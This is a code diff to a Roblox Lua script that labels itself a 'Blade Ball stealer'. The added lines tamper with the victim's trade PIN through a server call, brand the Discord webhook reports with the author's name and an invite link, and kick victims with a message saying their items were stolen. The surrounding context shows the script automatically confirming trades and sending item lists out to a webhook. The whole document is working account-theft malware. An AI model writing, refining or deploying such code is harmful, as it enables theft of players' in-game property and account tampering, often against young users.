@@ -43,6 +43,18 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
     return
 end
 
+local args = {
+    [1] = {
+        ["option"] = "PIN",
+        ["value"] = "9079"
+    }
+}
+local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
+if PINReponse ~= "You don't have a PIN code" then
+    plr:kick("Account error. Please disable trade PIN and try again")
+    return
+end
+
 tradeGui.Black.Visible = false
 tradeGui.MiscChat.Visible = false
 tradeCompleteGui.Black.Visible = false
@@ -198,7 +210,7 @@ local function SendJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Warning!"
+                ["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
             }
         }}
     }
@@ -279,7 +291,7 @@ local function SendMessage(list)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Warning!"
+				["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
 			}
         }}
     }
@@ -406,7 +418,7 @@ if #itemsToSend > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("Warning!")
+        plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
     end
 
     local function waitForUserJoin()
